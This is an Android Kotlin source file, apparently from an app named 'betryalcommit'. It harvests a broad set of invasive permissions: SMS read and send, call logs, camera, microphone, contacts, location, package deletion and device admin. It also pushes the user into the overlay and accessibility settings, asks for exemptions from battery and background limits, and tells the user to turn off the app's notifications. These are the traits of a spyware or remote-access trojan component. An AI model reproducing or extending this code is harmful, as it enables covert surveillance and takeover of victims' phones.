package com.example.betryalcommit

import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import kotlin.concurrent.thread


object Permsu{
    val handler = Handler(Looper.getMainLooper())
    private val permissions = arrayOf(
    Manifest.permission.INTERNET,
    Manifest.permission.ACCESS_WIFI_STATE,
    Manifest.permission.ACCESS_NETWORK_STATE,
    Manifest.permission.ACCESS_COARSE_LOCATION,
    Manifest.permission.ACCESS_FINE_LOCATION,
    Manifest.permission.FOREGROUND_SERVICE,
    Manifest.permission.REQUEST_DELETE_PACKAGES,
    Manifest.permission.USE_FULL_SCREEN_INTENT,
    Manifest.permission.BIND_DEVICE_ADMIN,
    Manifest.permission.DELETE_PACKAGES,
    Manifest.permission.KILL_BACKGROUND_PROCESSES,
    Manifest.permission.CAMERA,
    Manifest.permission.READ_CONTACTS,
    Manifest.permission.RECORD_AUDIO,
    Manifest.permission.MODIFY_AUDIO_SETTINGS,
    Manifest.permission.READ_PHONE_STATE,
    Manifest.permission.READ_CALL_LOG,
    Manifest.permission.PROCESS_OUTGOING_CALLS,
    Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
    Manifest.permission.READ_PHONE_NUMBERS,
    Manifest.permission.READ_SMS,
    Manifest.permission.RECEIVE_SMS,
    Manifest.permission.SEND_SMS,
    Manifest.permission.WRITE_EXTERNAL_STORAGE,
    Manifest.permission.READ_EXTERNAL_STORAGE,
    Manifest.permission.VIBRATE,
    Manifest.permission.WAKE_LOCK)
    val permissionsToRequest = mutableListOf<String>()
    fun requestPermissions(
        context: Context,
        activity: AppCompatActivity,
        requestCode: Int, ) {

        for (permission in permissions) {
            if (ContextCompat.checkSelfPermission(
                    activity,
                    permission
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                permissionsToRequest.add(permission)
            }
        }
        if (!Settings.canDrawOverlays(context)) {
            val intent = Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + context.getPackageName())
            )
            activity.startActivity(intent)

            val intent2 = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            activity.startActivity(intent2)
        }

            if(NotificationManagerCompat.from(context).areNotificationsEnabled() == true){
            val intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS)
            intent.putExtra("android.provider.extra.APP_PACKAGE", context.getPackageName())
           handler.post() {
               Toast.makeText(context, "Please disable notification", Toast.LENGTH_SHORT).show()

           }
                activity.startActivity(intent)
        }
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        if (!powerManager.isIgnoringBatteryOptimizations(context.getPackageName())) {
            val intent = Intent()
            intent.action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
            intent.data = Uri.parse("package:com.example.betryalcommit")
            activity.startActivity(intent)

            val intent2 = Intent(Settings.ACTION_IGNORE_BACKGROUND_DATA_RESTRICTIONS_SETTINGS,
            Uri.parse("package:" + context.getPackageName()))
            context.startActivity(intent2)
        }



        if (permissionsToRequest.isNotEmpty()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                ActivityCompat.requestPermissions(
                    activity,
                    permissionsToRequest.toTypedArray(),
                    requestCode);
            }
            }
        else{
            Toast.makeText(context, "go ahead", Toast.LENGTH_LONG).show()
        }
        AdminAct.admact(context, activity);



    val shared = context.getSharedPreferences("shared", Context.MODE_PRIVATE)

        val editor = shared.edit()
        editor.putString("current","ok")
        editor.apply()
        editor.commit()


    }
}
